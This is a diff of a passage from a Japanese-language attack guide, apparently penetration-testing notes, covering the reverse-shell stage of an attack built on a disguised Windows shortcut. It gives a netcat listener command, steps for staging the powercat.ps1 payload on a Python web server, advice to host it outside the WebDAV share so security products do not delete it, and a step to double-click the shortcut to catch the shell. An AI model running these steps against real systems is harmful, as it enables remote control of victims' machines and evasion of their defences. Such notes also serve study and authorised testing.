@@ -152,19 +152,20 @@ $$ショートカットの実行内容偽装$$
 
 ## 第4段階：リバースシェルの受信
 
-9. リバースシェルリスナーを起動しておく
+1. リバースシェルリスナーを起動
 ```zsh
-sudo rlwrap nc -lvnp <ListnerPort>
+sudo rlwrap nc -lvnp <port>
 ```
 
-10. PowerCatをwebdavディレックトリ**以外**にコピーし、Python webサーバを起動しておく
+2. PowerCatをwebdavディレックトリ**以外**にコピーし、Python webサーバを起動しておく
 ```zsh
 locate powercat.ps1
-cp </path/to/powercat.ps1> .
-sudo python -m http.server <Port>
+cp <path_to_powercat.ps1> .
+sudo python -m http.server <port> # WebDAVがポート80を使用中のため80以外を指定
 ```
-- (※WebDav共有用にポート80は使用済なので80以外を指定)
-- (WebDav共有にPowerCatをホストしない理由は、WebDav共有が書き込み可能であり、AVやセキュリティ製品に監視され、ペイロードを削除されるおそれがあるから)
+
+>[!NOTE]
+>PowerCatはWebDAVディレクトリではなく別のディレクトリにホストする。WebDAVは書き込み可能でセキュリティ製品に監視される可能性があり、ペイロードを削除されるおそれがあるため。
 
 11. テストのため、ショートカットファイルをダブルクリックし、正常にリバースシェルを受信できるか確認する
 
